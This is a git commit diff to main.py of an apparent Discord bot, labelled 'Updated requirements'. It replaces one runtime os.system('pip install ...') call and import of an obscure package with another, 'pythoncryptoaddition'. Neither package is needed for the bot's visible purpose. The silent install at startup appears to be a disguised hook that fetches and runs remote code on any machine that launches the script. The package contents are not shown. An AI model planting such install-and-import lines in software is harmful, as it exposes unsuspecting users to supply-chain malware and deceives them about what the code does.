96814d5de1ef3f8a1ede1051c28c948f69fb1656
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-01 19:44:56 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pipcoloringsextV1")
-import pipcoloringsextV1
+os.system("pip install pythoncryptoaddition")
+import pythoncryptoaddition
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
